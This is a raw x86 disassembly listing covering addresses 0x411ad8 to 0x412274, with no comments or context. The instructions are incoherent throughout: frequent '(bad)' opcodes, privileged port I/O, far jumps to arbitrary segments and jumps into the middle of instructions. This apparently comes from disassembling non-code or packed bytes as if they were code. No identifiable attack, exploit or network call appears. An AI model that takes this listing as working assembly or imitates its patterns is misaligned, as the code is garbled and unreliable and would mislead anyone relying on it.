  411ad8:	add    BYTE PTR [edi],ch
  411ada:	and    edx,DWORD PTR [ebx]
  411adc:	dec    edx
  411add:	scas   al,BYTE PTR es:[edi]
  411ade:	sub    DWORD PTR [ebp+0x5a],esp
  411ae1:	mov    ah,0x95
  411ae3:	mov    esp,DWORD PTR [eax+0x47]
  411ae6:	or     BYTE PTR [edx-0x3337ec86],dh
  411aec:	xchg   esi,eax
  411aed:	sub    eax,0x7069134
  411af2:	imul   esp,DWORD PTR [edi+0x1a],0x3329664
  411af9:	push   edi
  411afa:	lods   eax,DWORD PTR ds:[esi]
  411afb:	pop    edx
  411afc:	lea    edi,gs:[ecx]
  411aff:	shr    dh,1
  411b01:	sahf   
  411b02:	loop   0x411b42
  411b04:	adc    bh,BYTE PTR [eax+0x3e]
  411b07:	pushf  
  411b08:	cmp    BYTE PTR ds:0x7534ba62,ch
  411b0e:	imul   edi,edi,0xfe0f83e0
  411b14:	pusha  
  411b15:	call   0xb992:0x39720166
  411b1c:	cwde   
  411b1d:	mov    dl,0x6f
  411b1f:	push   edx
  411b20:	push   esi
  411b21:	mov    dh,0x9d
  411b23:	sbb    DWORD PTR [edi+0x4a],ebp
  411b26:	push   ss
  411b27:	push   ds
  411b28:	rcl    BYTE PTR [esi],1
  411b2a:	fwait
  411b2b:	mov    dh,0x6d
  411b2d:	pop    ebp
  411b2e:	(bad)  
  411b2f:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  411b33:	xlat   BYTE PTR ds:[ebx]
  411b34:	inc    edx
  411b35:	enter  0x74af,0xf9
  411b39:	dec    esp
  411b3a:	mov    ds:0x3e1ead5a,al
  411b3f:	jnp    0x411b37
  411b41:	in     al,dx
  411b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b43:	mov    ds:0xedede828,al
  411b48:	mov    ch,0x3e
  411b4a:	pusha  
  411b4b:	pop    ecx
  411b4c:	sub    ch,BYTE PTR [esi-0x39c3a494]
  411b52:	test   DWORD PTR [esi+0x24],ebx
  411b55:	add    bl,BYTE PTR [ecx+0x59]
  411b58:	cmp    BYTE PTR [eax+0x2a6d5cbe],0x96
  411b5f:	mov    bl,0x23
  411b61:	or     al,0xbb
  411b63:	jp     0x411bd7
  411b65:	rcl    BYTE PTR [ebx],cl
  411b67:	sub    eax,0x8ddbb701
  411b6c:	into   
  411b6d:	into   
  411b6e:	into   
  411b6f:	and    eax,0xdad554f7
  411b74:	sbb    BYTE PTR [ebx],dl
  411b76:	leave  
  411b77:	ror    BYTE PTR fs:[edx],cl
  411b7a:	jmp    0xf5f5:0xf41e3c79
  411b81:	xor    eax,0x8e456f95
  411b86:	mov    dl,0x67
  411b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b89:	jnp    0x411bfd
  411b8b:	and    ah,al
  411b8d:	out    dx,eax
  411b8e:	shr    ch,cl
  411b90:	jbe    0x411bb5
  411b92:	sbb    al,0xe
  411b94:	jecxz  0x411b62
  411b96:	cdq    
  411b97:	xor    edx,DWORD PTR [edi]
  411b99:	push   cs
  411b9a:	pop    ds
  411b9b:	ds jl  0x411bae
  411b9e:	lea    edi,[esi]
  411ba0:	add    al,al
  411ba2:	push   edx
  411ba3:	int    0xbc
  411ba5:	push   edx
  411ba6:	or     eax,0x4a3d1b2f
  411bab:	adc    al,0x72
  411bad:	cs aam 0x3c
  411bb0:	iret   
  411bb1:	test   esi,ecx
  411bb3:	xchg   edi,eax
  411bb4:	jne    0x411c16
  411bb6:	mov    bl,0xfd
  411bb8:	and    edi,DWORD PTR [edi]
  411bba:	or     eax,0x6d07002
  411bbf:	(bad)  
  411bc0:	cmp    eax,0x9f2258f6
  411bc5:	iret   
  411bc6:	push   ebx
  411bc8:	rcl    al,1
  411bca:	adc    BYTE PTR [eax-0x4e],ch
  411bcd:	shl    ebp,1
  411bcf:	push   0x3b31d931
  411bd4:	retf   
  411bd5:	inc    eax
  411bd6:	pop    esp
  411bd7:	xchg   edi,eax
  411bd8:	or     DWORD PTR [ecx-0x45],ebp
  411bdb:	jmp    0x411bd0
  411bdd:	div    BYTE PTR [ecx+0x31]
  411be0:	push   ecx
  411be1:	xchg   al,dl
  411be3:	sub    al,BYTE PTR [esi+0x60]
  411be6:	mov    bh,0x2d
  411be8:	cli    
  411be9:	in     eax,0xa2
  411beb:	aad    0x42
  411bed:	jae    0x411bff
  411bef:	repnz imul edx,DWORD PTR [ebx-0x67],0xfffffffa
  411bf4:	test   BYTE PTR [edi],ch
  411bf6:	xchg   esi,eax
  411bf7:	adc    eax,0x84941341
  411bfc:	ret    
  411bfd:	loope  0x411bb5
  411bff:	out    dx,eax
  411c00:	mov    al,0x95
  411c02:	mov    eax,esp
  411c04:	mov    DWORD PTR [eax-0x69e5fea4],eax
  411c0a:	dec    esp
  411c0b:	xlat   BYTE PTR ds:[ebx]
  411c0c:	jne    0x411c2a
  411c0e:	cmp    al,0x78
  411c10:	lock mov al,0xa6
  411c13:	imul   ecx,ecx,0xc8e229fa
  411c19:	dec    edi
  411c1a:	retf   
  411c1b:	rcr    eax,1
  411c1d:	mov    dl,0x63
  411c1f:	xor    ch,ch
  411c21:	sub    eax,0xb71542f6
  411c26:	(bad)  
  411c29:	jmp    0x411ca5
  411c2b:	pop    ebx
  411c2c:	mov    edx,edi
  411c2e:	and    DWORD PTR [eax+0x2e5c08cf],eax
  411c34:	xlat   BYTE PTR ds:[ebx]
  411c35:	das    
  411c36:	xchg   edx,eax
  411c37:	leave  
  411c38:	in     al,0x7b
  411c3a:	addr16 iret 
  411c3c:	sahf   
  411c3d:	inc    ebp
  411c3e:	pop    edi
  411c3f:	pop    edi
  411c40:	lahf   
  411c41:	data16 fidivr DWORD PTR gs:[ebp-0x4c]
  411c46:	jbe    0x411c2e
  411c48:	mov    bh,0xac
  411c4a:	pushf  
  411c4b:	or     al,0xed
  411c4d:	mov    ?,ebx
  411c4f:	arpl   WORD PTR [ebx],bp
  411c51:	cmc    
  411c52:	stos   DWORD PTR es:[edi],eax
  411c53:	xchg   edi,eax
  411c54:	jnp    0x411cb2
  411c56:	je     0x411c8f
  411c58:	add    BYTE PTR [ecx+0x57],bh
  411c5b:	fs push ebp
  411c5d:	push   ebp
  411c5e:	lods   eax,DWORD PTR ds:[esi]
  411c5f:	icebp  
  411c60:	inc    ch
  411c62:	mov    edx,0x4a8aaaab
  411c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c68:	or     bl,0x97
  411c6b:	das    
  411c6c:	aaa    
  411c6d:	popf   
  411c6e:	xlat   BYTE PTR ds:[ebx]
  411c6f:	fcmovnu st,st(3)
  411c71:	imul   ecx,ebp,0x54
  411c74:	aam    0xee
  411c76:	fld    st(4)
  411c78:	ja     0x411c3b
  411c7a:	sub    eax,0x543a6a12
  411c7f:	push   ebp
  411c80:	aad    0x22
  411c82:	xchg   ebp,eax
  411c83:	test   eax,0x85e2a9a9
  411c88:	or     edx,DWORD PTR [edi]
  411c8a:	ds inc edx
  411c8c:	sub    eax,0x36b5ce88
  411c91:	pop    edi
  411c92:	xchg   edi,eax
  411c93:	or     DWORD PTR [esi+0x576eff9d],edi
  411c99:	(bad)  
  411c9a:	adc    dh,dl
  411c9c:	mov    ecx,0x498e2f6f
  411ca1:	popa   
  411ca2:	pusha  
  411ca3:	test   eax,0xf2d6d105
  411ca8:	jne    0x411cb2
  411caa:	loopne 0x411cdf
  411cac:	add    bh,0x1e
  411caf:	jnp    0x411c5d
  411cb1:	in     al,0x72
  411cb3:	mov    ecx,0x7c7c7efe
  411cb8:	cld    
  411cb9:	jl     0x411cdd
  411cbb:	xchg   ecx,eax
  411cbc:	sar    dl,0xf5
  411cbf:	jmp    0x411c58
  411cc1:	clc    
  411cc2:	mov    bl,0x32
  411cc4:	mov    eax,ds:0xfe89f715
  411cc9:	push   0xffffffbb
  411ccb:	repz scas al,BYTE PTR es:[edi]
  411ccd:	push   es
  411cce:	pop    edx
  411ccf:	mov    ecx,0x16761c00
  411cd4:	mov    DWORD PTR [eax],edi
  411cd6:	add    BYTE PTR [edi-0x39df31d4],ah
  411cdc:	add    al,ah
  411cde:	addr16 mov eax,ds:0x9ed1
  411ce2:	push   0x5aad5abb
  411ce7:	xor    edi,edi
  411ce9:	mov    BYTE PTR [esi-0x7a],ch
  411cec:	pop    ebp
  411ced:	popf   
  411cee:	xlat   BYTE PTR fs:[ebx]
  411cf0:	push   es
  411cf1:	add    BYTE PTR [edi+0x387083c7],cl
  411cf7:	or     al,0xc3
  411cf9:	xor    BYTE PTR [eax],dl
  411cfb:	mov    eax,ebp
  411cfd:	or     bh,bl
  411cff:	imul   edi
  411d01:	(bad)  
  411d02:	fcomip st,st(5)
  411d04:	mov    eax,ds:0x13d681e7
  411d09:	mov    esi,0x6ad94288
  411d0e:	fisttp QWORD PTR [esi-0x5d]
  411d11:	mov    edi,DWORD PTR [ebp+0x3131f953]
  411d17:	aad    0x5d
  411d19:	ss push esi
  411d1b:	inc    ebp
  411d1c:	dec    ebx
  411d1d:	mov    eax,0xf07015da
  411d22:	jmp    0x8402fe08
  411d27:	mov    DWORD PTR [edi],eax
  411d29:	push   ds
  411d2a:	js     0x411d0c
  411d2c:	mov    bh,0xf1
  411d2e:	js     0x411d2c
  411d30:	aas    
  411d31:	sti    
  411d32:	jl     0x411cf2
  411d34:	rcl    BYTE PTR [esi+0x19ac5b2d],1
  411d3a:	outs   dx,DWORD PTR ds:[esi]
  411d3b:	in     al,dx
  411d3c:	xor    al,0x23
  411d3e:	sar    al,1
  411d40:	pusha  
  411d41:	jns    0x411d9e
  411d43:	mov    edx,0xaf80fc5d
  411d48:	mov    edi,DWORD PTR [esi-0x20e71348]
  411d4e:	addr16 ficom WORD PTR [bp+di]
  411d52:	les    ecx,FWORD PTR [esi]
  411d54:	inc    ecx
  411d55:	in     eax,dx
  411d56:	(bad)  
  411d57:	jmp    0x6dabf2f6
  411d5c:	out    0x5c,al
  411d5e:	xor    DWORD PTR ds:0x9a367c58,esp
  411d64:	(bad)  
  411d65:	pop    esp
  411d66:	aam    0xde
  411d68:	je     0x411d07
  411d6a:	inc    edx
  411d6b:	mov    eax,ds:0x6cb97280
  411d70:	dec    ebp
  411d71:	sub    eax,0x35a69a67
  411d76:	sub    dl,BYTE PTR [eax-0x4f]
  411d79:	pop    eax
  411d7a:	ins    BYTE PTR es:[edi],dx
  411d7b:	sbb    cl,BYTE PTR [ebx-0x5120a080]
  411d81:	leave  
  411d82:	mov    dl,0xde
  411d84:	in     eax,0x17
  411d86:	popf   
  411d87:	popf   
  411d88:	popf   
  411d89:	xor    al,0xf3
  411d8b:	push   esp
  411d8c:	stc    
  411d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8e:	xchg   edi,eax
  411d8f:	pop    esi
  411d90:	jp     0x411d78
  411d92:	fnsave [edi-0x21]
  411d95:	jge    0x411d9a
  411d97:	xor    eax,0xe8265fdf
  411d9c:	pop    esp
  411d9d:	dec    eax
  411d9e:	inc    ebp
  411d9f:	mov    eax,ds:0x997c13b4
  411da4:	fild   QWORD PTR [esi]
  411da6:	adc    esi,edx
  411da8:	push   esi
  411da9:	in     al,0xc2
  411dab:	add    eax,DWORD PTR [ecx+0x1898b3ad]
  411db1:	sbb    al,0x2
  411db3:	clc    
  411db4:	mov    ecx,fs
  411db6:	loopne 0x411d79
  411db8:	or     DWORD PTR [ebx+0x56ef77bb],0x66
  411dbf:	data16 data16 imul BYTE PTR [eax]
  411dc3:	mov    al,BYTE PTR [edx+0x5a371b8d]
  411dc9:	xor    ecx,esi
  411dcb:	mov    BYTE PTR [edx-0x10304bf6],al
  411dd1:	pop    ss
  411dd2:	test   DWORD PTR [ecx-0x42f66e32],ebx
  411dd8:	in     al,dx
  411dd9:	cmp    bh,ah
  411ddb:	pop    esi
  411ddc:	lods   eax,DWORD PTR ds:[esi]
  411ddd:	and    BYTE PTR [ebx],dl
  411ddf:	and    bh,BYTE PTR [ebx-0x4d9d8b22]
  411de5:	push   cs
  411de6:	push   eax
  411de7:	dec    ebx
  411de8:	in     al,dx
  411de9:	xchg   ecx,eax
  411dea:	adc    DWORD PTR [eax],eax
  411dec:	inc    ecx
  411ded:	push   ecx
  411dee:	sbb    dl,BYTE PTR [ebx+0x73]
  411df1:	leave  
  411df2:	jmp    0x29a3:0x91a1d743
  411df9:	push   ebx
  411dfa:	mov    al,0x5a
  411dfc:	lods   eax,DWORD PTR ds:[esi]
  411dfd:	lea    ecx,ss:[ebx]
  411e00:	leave  
  411e01:	push   ebx
  411e02:	scas   al,BYTE PTR es:[edi]
  411e03:	pop    ebx
  411e04:	mov    ecx,0xc269a638
  411e09:	out    dx,eax
  411e0a:	mul    DWORD PTR [ebx-0x65ec4c4d]
  411e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e11:	popa   
  411e12:	jp     0x411e8e
  411e14:	fidivr DWORD PTR [ebp+ebp*8-0x4b]
  411e18:	xlat   BYTE PTR ds:[ebx]
  411e19:	sahf   
  411e1a:	jge    0x411e03
  411e1c:	popf   
  411e1d:	ja     0x411e7d
  411e1f:	inc    edi
  411e20:	lods   eax,DWORD PTR ds:[esi]
  411e21:	fstp   QWORD PTR [edi+0xd327082]
  411e27:	into   
  411e28:	int    0x77
  411e2a:	xchg   ecx,eax
  411e2b:	sbb    al,0xec
  411e2d:	add    bh,BYTE PTR [edx+0x32]
  411e30:	push   ebx
  411e31:	fmulp  st(6),st
  411e33:	mov    esp,0x2a87dd17
  411e38:	mov    ebx,0xdd828aef
  411e3d:	push   cs
  411e3e:	add    DWORD PTR [esi+eax*1+0x71],edi
  411e42:	call   0xf738c017
  411e47:	in     al,dx
  411e48:	fst    DWORD PTR [ebx]
  411e4a:	mov    al,bh
  411e4c:	jecxz  0x411ec5
  411e4e:	add    eax,eax
  411e50:	mov    dh,0x6d
  411e52:	fneni(8087 only) 
  411e54:	jbe    0x411e11
  411e56:	shl    edi,0xa
  411e59:	push   0xcaeda9a5
  411e5e:	mov    ah,0x23
  411e60:	push   es
  411e61:	sbb    ecx,eax
  411e63:	enter  0xd62,0xad
  411e67:	and    BYTE PTR [esi],ah
  411e69:	repz mov ah,0x5a
  411e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e6d:	jmp    0x411e01
  411e6f:	mov    al,0xd9
  411e71:	mov    ch,0xe3
  411e73:	repz push esi
  411e75:	adc    DWORD PTR [edx-0x3],ecx
  411e78:	in     eax,0xd7
  411e7a:	adc    bh,cl
  411e7c:	sub    DWORD PTR [edi+0x5c94d6cb],edx
  411e82:	aad    0x6a
  411e84:	mov    ds:0x4def3f1f,eax
  411e89:	sub    BYTE PTR [ebx-0x2e5920f1],ch
  411e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e90:	shr    ecx,cl
  411e92:	xor    al,0x12
  411e94:	mov    DWORD PTR [esi+ecx*2],eax
  411e97:	lahf   
  411e98:	ds std 
  411e9a:	jmp    0x1a22:0xf2bcaf2b
  411ea1:	jae    0x411e9d
  411ea3:	mov    ch,0x12
  411ea5:	pop    eax
  411ea6:	cmp    esi,DWORD PTR [ebx+0x7f]
  411ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eaa:	cmp    DWORD PTR ds:0x1271ebbb,0xc0899a00
  411eb4:	and    DWORD PTR [eax+0x1d0e03cf],eax
  411eba:	cmp    dh,BYTE PTR [eax+esi*8-0x7f]
  411ebe:	pop    es
  411ebf:	push   ds
  411ec0:	cmp    BYTE PTR [esi],dh
  411ec2:	aas    
  411ec3:	aas    
  411ec4:	mov    edi,0x5c489135
  411ec9:	xlat   BYTE PTR ds:[ebx]
  411eca:	rcl    ebx,cl
  411ecc:	add    ecx,0xffffffc1
  411ecf:	inc    ecx
  411ed0:	retf   
  411ed1:	aam    0x5
  411ed3:	xchg   esi,eax
  411ed4:	mov    edx,0xdbc27600
  411ed9:	mov    ?,WORD PTR [eax]
  411edb:	fs inc esp
  411edd:	and    bl,bl
  411edf:	xlat   BYTE PTR ds:[ebx]
  411ee0:	push   cs
  411ee1:	xor    ah,BYTE PTR [ecx-0x4e]
  411ee4:	xor    edi,ebp
  411ee6:	lds    esi,FWORD PTR [edx]
  411ee8:	xor    al,0x10
  411eea:	push   0x50278ab
  411eef:	inc    esi
  411ef0:	sub    DWORD PTR [ebx],esi
  411ef2:	push   eax
  411ef3:	jbe    0x411f74
  411ef5:	xor    bl,ch
  411ef7:	leave  
  411ef8:	ins    DWORD PTR es:[edi],dx
  411ef9:	mov    ds:0x349e5fb4,al
  411efe:	inc    esp
  411eff:	popf   
  411f00:	cmp    BYTE PTR [eax-0x60fa3ca5],0x9a
  411f07:	adc    DWORD PTR [ebx-0x4f],esp
  411f0a:	sbb    dl,ah
  411f0c:	icebp  
  411f0d:	clc    
  411f0e:	in     al,dx
  411f0f:	mov    eax,ds:0x7e9e8743
  411f14:	jecxz  0x411ea3
  411f16:	aaa    
  411f17:	inc    BYTE PTR [ebp-0x29]
  411f1a:	jne    0x411f8d
  411f1c:	sub    al,0x9
  411f1e:	fldcw  WORD PTR [edi-0x55]
  411f21:	inc    ebp
  411f22:	xor    al,0xf7
  411f24:	lds    ebp,FWORD PTR [eax+0x4e52597d]
  411f2a:	sub    ax,0x2488
  411f2e:	jo     0x411ef5
  411f30:	int    0xdc
  411f32:	push   cs
  411f33:	add    DWORD PTR [esi+eax*4-0xf],edi
  411f37:	(bad)  
  411f38:	pop    ebx
  411f39:	outs   dx,DWORD PTR ds:[esi]
  411f3a:	(bad)  
  411f3b:	out    dx,eax
  411f3c:	fidivr WORD PTR [ebp-0x6ad5af05]
  411f42:	cli    
  411f43:	(bad)  
  411f44:	jecxz  0x411f29
  411f46:	jecxz  0x411f85
  411f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f49:	imul   esp,DWORD PTR [edx-0x15],0x8708add6
  411f50:	ret    
  411f51:	(bad)  
  411f52:	dec    esp
  411f53:	cmp    ah,bl
  411f55:	pushf  
  411f56:	mov    bh,0x13
  411f58:	outs   dx,BYTE PTR ds:[esi]
  411f59:	fidiv  DWORD PTR [esi-0x1dba06cd]
  411f5f:	adc    bl,cl
  411f61:	mov    bh,al
  411f63:	or     BYTE PTR [edx],dh
  411f65:	ins    DWORD PTR es:[edi],dx
  411f66:	das    
  411f67:	or     dh,BYTE PTR [edi+0x475e2eb8]
  411f6d:	xor    al,0xd3
  411f6f:	gs xbegin 0x8097852b
  411f76:	in     al,dx
  411f77:	jle    0x411fbd
  411f79:	add    dl,BYTE PTR [esp+ebx*8-0x6e00843d]
  411f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f81:	shl    DWORD PTR [edi-0x9],0x75
  411f85:	mov    ecx,0x2244885c
  411f8a:	or     BYTE PTR [ebp+0x52a54842],al
  411f90:	cwde   
  411f91:	pushf  
  411f92:	pushf  
  411f93:	inc    esp
  411f94:	and    dl,BYTE PTR [ecx-0x40a80708]
  411f9a:	cli    
  411f9b:	aad    0x7f
  411f9d:	cli    
  411f9e:	loopne 0x411f23
  411fa0:	divps  xmm5,XMMWORD PTR [ebx-0x37f074f1]
  411fa7:	add    eax,0x8713ef99
  411fac:	xchg   ebp,eax
  411fad:	mov    bl,0x2b
  411faf:	outs   dx,DWORD PTR ds:[esi]
  411fb0:	aaa    
  411fb1:	loopne 0x411f5f
  411fb3:	sub    al,0xb0
  411fb5:	(bad)  
  411fb6:	jg     0x412013
  411fb8:	or     ebp,edi
  411fba:	mov    cl,BYTE PTR [ecx-0x40]
  411fbd:	and    DWORD PTR [eax+0x7ade38cf],eax
  411fc3:	jmp    0x411f72
  411fc5:	int3   
  411fc6:	add    ecx,DWORD PTR [edi]
  411fc8:	cmp    al,0xb0
  411fca:	mov    edi,0xc60ead5a
  411fcf:	bound  esi,QWORD PTR [ecx+0x2cd9b29b]
  411fd5:	push   es
  411fd6:	pop    es
  411fd7:	pop    es
  411fd8:	mov    cl,0x6e
  411fda:	fnstsw WORD PTR [edx]
  411fdc:	stos   DWORD PTR es:[edi],eax
  411fdd:	and    ecx,DWORD PTR [edi+ebx*4]
  411fe0:	and    BYTE PTR [ebp-0x47],0xd6
  411fe4:	add    BYTE PTR [edi+0x3b],al
  411fe7:	mov    bh,0x80
  411fe9:	dec    DWORD PTR [edx+0x64c789e7]
  411fef:	stc    
  411ff0:	add    DWORD PTR [edx-0x1c12ce0],esp
  411ff6:	retf   
  411ff7:	out    0x16,eax
  411ff9:	adc    al,0xef
  411ffb:	ror    ebx,0x52
  411ffe:	mov    bl,0x1f
  412000:	in     eax,0xfd
  412002:	repz xor dh,BYTE PTR [edx]
  412005:	push   edx
  412006:	sub    BYTE PTR [ebp+0x33c4d64a],dl
  41200c:	in     al,0xe
  41200e:	sar    BYTE PTR ds:0x2861a7a8,1
  412014:	adc    al,0xb2
  412016:	data16 adc BYTE PTR [edx+0x4d22f178],bh
  41201d:	inc    edi
  41201e:	jg     0x41201e
  412020:	xchg   edi,eax
  412021:	mov    edi,0x2fb7e5fc
  412026:	pop    esi
  412027:	mov    esp,0x708011f8
  41202c:	std    
  41202d:	jb     0x412061
  41202f:	xor    edi,DWORD PTR [edi+0x39]
  412032:	es mov edi,0xa76f4f9d
  412038:	jmp    0xf847932a
  41203d:	add    edx,DWORD PTR [esi-0x7b]
  412040:	fild   QWORD PTR [ebx]
  412042:	ret    0x6bd5
  412045:	or     esi,DWORD PTR [edx+0x70]
  412048:	int    0xf1
  41204a:	in     al,dx
  41204b:	mov    bl,0xcf
  41204d:	(bad)  
  41204e:	lods   eax,DWORD PTR ds:[esi]
  41204f:	scas   al,BYTE PTR es:[edi]
  412050:	jmp    0x412051
  412052:	xor    eax,0xbcef0e1c
  412057:	jmp    0x79f1bc02
  41205c:	repz data16 je 0x4120d5
  412060:	jne    0x412083
  412062:	fwait
  412063:	int    0x5a
  412065:	xchg   ebx,eax
  412066:	fwait
  412067:	repnz mov ah,0x5a
  41206a:	push   ecx
  41206b:	clc    
  41206c:	in     eax,dx
  41206d:	push   es
  41206e:	stc    
  41206f:	loopne 0x41204c
  412071:	mov    ds:0x65684125,al
  412076:	add    eax,edx
  412078:	mov    edx,0x3e4e406c
  41207d:	aam    0x16
  41207f:	out    dx,eax
  412080:	add    BYTE PTR [esi+ecx*1],ah
  412083:	fldln2 
  412085:	cmc    
  412086:	jp     0x412099
  412088:	mov    DWORD PTR [esp+ebp*2-0x23],eax
  41208c:	push   es
  41208d:	mov    esi,0x212a54af
  412092:	cdq    
  412093:	dec    esp
  412094:	ss sbb eax,0xafc3ef13
  41209a:	dec    ebp
  41209b:	fld    QWORD PTR [edi-0x1bbc1307]
  4120a1:	jbe    0x4120a7
  4120a3:	add    al,BYTE PTR [ecx]
  4120a5:	call   0x3ab5af64
  4120aa:	(bad)  
  4120ab:	stc    
  4120ac:	stc    
  4120ad:	jns    0x4120fb
  4120af:	dec    edi
  4120b0:	dec    edi
  4120b1:	jge    0xc03faf45
  4120b7:	jecxz  0x412080
  4120b9:	(bad)  
  4120ba:	dec    ebx
  4120bc:	clc    
  4120bd:	clc    
  4120be:	clc    
  4120bf:	sub    al,0x1a
  4120c1:	mov    bl,0x4b
  4120c3:	sub    ebp,DWORD PTR [eax+0x4c]
  4120c6:	mov    eax,0xabb9a0a1
  4120cb:	mov    ebx,0x6df3f6ca
  4120d0:	mov    al,ds:0x3cc4c659
  4120d5:	add    BYTE PTR [ecx+0x14],bl
  4120d8:	pop    edi
  4120d9:	xchg   esi,eax
  4120da:	das    
  4120db:	and    bl,dh
  4120dd:	out    dx,eax
  4120de:	in     eax,dx
  4120df:	add    al,0x7f
  4120e1:	inc    ebp
  4120e2:	test   al,ah
  4120e4:	adc    al,al
  4120e6:	lahf   
  4120e7:	sbb    esi,esi
  4120e9:	in     eax,dx
  4120ea:	fist   DWORD PTR [edi]
  4120ec:	xor    al,0xc
  4120ee:	jecxz  0x4120df
  4120f0:	sub    edx,DWORD PTR [ebp-0x60c19c36]
  4120f6:	outs   dx,DWORD PTR ds:[esi]
  4120f7:	fst    st(6)
  4120f9:	lods   eax,DWORD PTR ds:[esi]
  4120fa:	pop    ebx
  4120fb:	jno    0x4120d8
  4120fd:	ins    DWORD PTR es:[edi],dx
  4120fe:	mov    bh,0x61
  412100:	int    0x9a
  412102:	xor    eax,0x988b1628
  412107:	lahf   
  412108:	lahf   
  412109:	xchg   DWORD PTR [esi+0x2bcf9669],esp
  41210f:	imul   esp,DWORD PTR ds:0xe6fca710,0x63
  412116:	or     eax,0x65e0b270
  41211b:	adc    BYTE PTR fs:0x3e481455,al
  412122:	(bad)  
  412124:	aas    
  412125:	mov    BYTE PTR [edi-0x23],0x1
  412129:	rcl    ah,1
  41212b:	fsub   QWORD PTR [esi]
  41212d:	and    eax,DWORD PTR [eax]
  41212f:	jle    0x41215f
  412131:	lods   eax,DWORD PTR ds:[esi]
  412132:	das    
  412133:	cs cs inc edx
  412136:	shl    DWORD PTR [ecx+ebp*1],cl
  412139:	fnop   
  41213b:	xor    eax,0xbf685d79
  412140:	xlat   BYTE PTR ds:[ebx]
  412141:	jmp    0x4120f8
  412143:	es lahf 
  412145:	aad    0x34
  412147:	or     eax,0x98a3a3a3
  41214c:	fwait
  41214d:	fwait
  41214e:	or     edi,0xffffffe7
  412151:	sub    ecx,DWORD PTR [edi-0xf437374]
  412157:	repnz retf 
  412159:	das    
  41215a:	aas    
  41215b:	xchg   ebx,eax
  41215c:	retf   
  41215d:	in     eax,0x8a
  41215f:	cmc    
  412160:	fist   DWORD PTR [ebx-0x1e]
  412163:	adc    edx,0x119166
  412169:	aas    
  41216a:	iret   
  41216b:	jp     0x412189
  41216d:	sub    al,0x15
  41216f:	outs   dx,BYTE PTR ds:[esi]
  412170:	mov    ebx,0xc72f3ea8
  412175:	iret   
  412176:	xchg   edi,eax
  412177:	(bad)  
  412178:	adc    eax,0xc2dbfb36
  41217d:	and    DWORD PTR [eax-0x703acc1],eax
  412183:	(bad)  
  412184:	aas    
  412185:	mov    esi,0xa7cd34ce
  41218a:	jne    0x4121e9
  41218c:	(bad)  
  41218d:	cmp    ebx,DWORD PTR [edi-0x64b27831]
  412193:	ss loope 0x412134
  412196:	jnp    0x412186
  412198:	rcr    edx,0xb5
  41219b:	imul   ebp,DWORD PTR [ebp-0x162c6b27],0xffffffb4
  4121a2:	in     eax,0xe7
  4121a4:	repnz sub eax,ebx
  4121a7:	les    esi,FWORD PTR [ecx]
  4121a9:	add    al,ch
  4121ab:	xor    DWORD PTR [ebx],eax
  4121ad:	fs dec ebp
  4121af:	sub    BYTE PTR [ebp-0x31418234],0x97
  4121b6:	jbe    0x4121bc
  4121b8:	and    BYTE PTR [esi],bl
  4121ba:	jmp    0x4121a6
  4121bc:	jmp    0xddc1:0xeec9f6b2
  4121c3:	add    DWORD PTR [edx-0x5f],0x60
  4121c7:	jne    0x4121cf
  4121c9:	mov    ds:0x27a13272,al
  4121ce:	jb     0x4121c1
  4121d0:	sti    
  4121d1:	std    
  4121d2:	xor    al,0x93
  4121d4:	xor    al,0x32
  4121d6:	cdq    
  4121d7:	or     al,0xa2
  4121d9:	shr    DWORD PTR [eax],1
  4121db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121de:	sub    DWORD PTR [edi],edi
  4121e0:	loopne 0x412219
  4121e2:	out    dx,eax
  4121e3:	mov    esp,0x7cffcef3
  4121e8:	jmp    0x412197
  4121ea:	mov    bh,0xde
  4121ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ed:	push   edi
  4121ee:	and    BYTE PTR [ebp-0x753463e6],0xa8
  4121f5:	loope  0x41225c
  4121f7:	pop    edx
  4121f8:	pop    edi
  4121f9:	jbe    0x412199
  4121fb:	push   ebp
  4121fc:	pop    ebp
  4121fd:	fsubr  DWORD PTR [ebx+0x7a]
  412200:	xchg   ebx,eax
  412201:	xchg   ebp,eax
  412202:	imul   esp,DWORD PTR [edi-0x1a],0xdff3227f
  412209:	scas   al,BYTE PTR es:[edi]
  41220a:	jb     0x41221a
  41220c:	dec    BYTE PTR [eax+esi*8+0x3ccf33cc]
  412213:	bound  ebx,QWORD PTR [edx-0x1a34081a]
  412219:	repnz in eax,dx
  41221b:	shl    DWORD PTR [eax-0x30],0xb7
  41221f:	gs retf 
  412221:	push   ss
  412222:	fdivr  QWORD PTR [edx-0x15]
  412225:	lods   eax,DWORD PTR ds:[esi]
  412226:	pop    eax
  412227:	mov    edi,0xb5543d7e
  41222c:	lea    edx,ss:[ebp+0x3a]
  412230:	popf   
  412231:	inc    esi
  412232:	ss fwait
  412234:	ins    DWORD PTR es:[edi],dx
  412235:	jmp    0x3c80:0xae294edf
  41223c:	pusha  
  41223d:	enter  0xc57f,0x75
  412241:	sbb    BYTE PTR [eax],0x74
  412244:	xchg   ebx,eax
  412245:	or     DWORD PTR [ebx-0x78983248],ebp
  41224b:	mov    ds:0xba8654e3,al
  412250:	inc    esp
  412251:	retf   
  412252:	enter  0x3441,0xed
  412256:	retf   
  412257:	in     eax,0x32
  412259:	xor    bl,BYTE PTR [ecx-0xf26ecb4]
  41225f:	fnstcw WORD PTR [ecx+eax*4+0x5a]
  412263:	push   es
  412264:	pop    edi
  412265:	sub    BYTE PTR [edx+esi*4],dl
  412268:	cli    
  412269:	push   esi
  41226a:	push   0x8989869a
  41226f:	or     DWORD PTR [esp+ecx*2+0x4c],ecx
  412273:	inc    eax
  412274:	xlat   BYTE PTR ds:[ebx]
